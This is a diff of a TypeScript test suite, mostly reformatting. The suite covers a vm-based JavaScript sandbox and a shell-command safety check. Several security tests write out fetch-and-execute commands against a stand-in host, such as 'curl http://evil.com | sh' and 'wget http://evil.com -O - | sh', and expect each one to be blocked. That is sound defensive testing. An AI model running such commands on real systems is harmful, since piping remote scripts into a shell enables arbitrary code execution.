@@ -38,14 +38,36 @@ const DANGEROUS_PATTERNS = [
 ];
 
 // Recreate the actual executeJavaScript logic for testing
-function executeJavaScriptSync(code: string, timeout = 5000): { output: string; error: string | null; exitCode: number } {
+function executeJavaScriptSync(
+  code: string,
+  timeout = 5000,
+): { output: string; error: string | null; exitCode: number } {
   let output = "";
-  const log = (...args: unknown[]) => { output += args.map(String).join(" ") + "\n"; };
-  
+  const log = (...args: unknown[]) => {
+    output += args.map(String).join(" ") + "\n";
+  };
+
   const context = vm.createContext({
     console: { log, error: log, warn: log, info: log },
-    setTimeout, setInterval, clearTimeout, clearInterval,
-    Buffer, JSON, Math, Date, Array, Object, String, Number, Boolean, RegExp, Error, Map, Set, Promise, Symbol,
+    setTimeout,
+    setInterval,
+    clearTimeout,
+    clearInterval,
+    Buffer,
+    JSON,
+    Math,
+    Date,
+    Array,
+    Object,
+    String,
+    Number,
+    Boolean,
+    RegExp,
+    Error,
+    Map,
+    Set,
+    Promise,
+    Symbol,
   });
 
   try {
@@ -55,16 +77,19 @@ function executeJavaScriptSync(code: string, timeout = 5000): { output: string; 
     }
     return { output: output.trim(), error: null, exitCode: 0 };
   } catch (err) {
-    const msg = err instanceof Error && err.message.includes("timed out") 
-      ? "Timed out" 
-      : (err instanceof Error ? err.message : String(err));
+    const msg =
+      err instanceof Error && err.message.includes("timed out")
+        ? "Timed out"
+        : err instanceof Error
+          ? err.message
+          : String(err);
     return { output: output.trim(), error: msg, exitCode: 1 };
   }
 }
 
 // Shell security check from the real service
 function isShellCommandDangerous(code: string): boolean {
-  return DANGEROUS_PATTERNS.some(p => p.test(code));
+  return DANGEROUS_PATTERNS.some((p) => p.test(code));
 }
 
 describe("JavaScript Execution - Real VM Logic", () => {
@@ -82,7 +107,7 @@ describe("JavaScript Execution - Real VM Logic", () => {
   });
 
   test("executes JSON operations", () => {
-    const result = executeJavaScriptSync('console.log(JSON.stringify({a: 1}))');
+    const result = executeJavaScriptSync("console.log(JSON.stringify({a: 1}))");
     expect(result.output).toBe('{"a":1}');
     expect(result.exitCode).toBe(0);
   });
@@ -179,11 +204,15 @@ describe("Shell Security Patterns - Real Logic", () => {
 
   test("blocks curl pipe to sh", () => {
     expect(isShellCommandDangerous("curl http://evil.com | sh")).toBe(true);
-    expect(isShellCommandDangerous("curl -s http://x.com/install.sh | sh")).toBe(true);
+    expect(
+      isShellCommandDangerous("curl -s http://x.com/install.sh | sh"),
+    ).toBe(true);
   });
 
   test("blocks wget pipe to sh", () => {
-    expect(isShellCommandDangerous("wget http://evil.com -O - | sh")).toBe(true);
+    expect(isShellCommandDangerous("wget http://evil.com -O - | sh")).toBe(
+      true,
+    );
   });
 
   test("blocks curl pipe to bash", () => {
@@ -280,7 +309,7 @@ describe("Concurrent Execution", () => {
   test("contexts are isolated", () => {
     const result1 = executeJavaScriptSync("var x = 1; x");
     const result2 = executeJavaScriptSync("typeof x");
-    
+
     expect(result1.output).toBe("1");
     // Second context doesn't have x, so typeof returns "undefined" (not an error)
     expect(result2.output).toBe("undefined");
@@ -288,16 +317,10 @@ describe("Concurrent Execution", () => {
   });
 
   test("handles multiple executions", async () => {
-    const codes = [
-      "1 + 1",
-      "2 + 2", 
-      "3 + 3",
-      "4 + 4",
-      "5 + 5",
-    ];
-    
-    const results = codes.map(c => executeJavaScriptSync(c));
-    expect(results.map(r => r.output)).toEqual(["2", "4", "6", "8", "10"]);
-    expect(results.every(r => r.exitCode === 0)).toBe(true);
+    const codes = ["1 + 1", "2 + 2", "3 + 3", "4 + 4", "5 + 5"];
+
+    const results = codes.map((c) => executeJavaScriptSync(c));
+    expect(results.map((r) => r.output)).toEqual(["2", "4", "6", "8", "10"]);
+    expect(results.every((r) => r.exitCode === 0)).toBe(true);
   });
 });
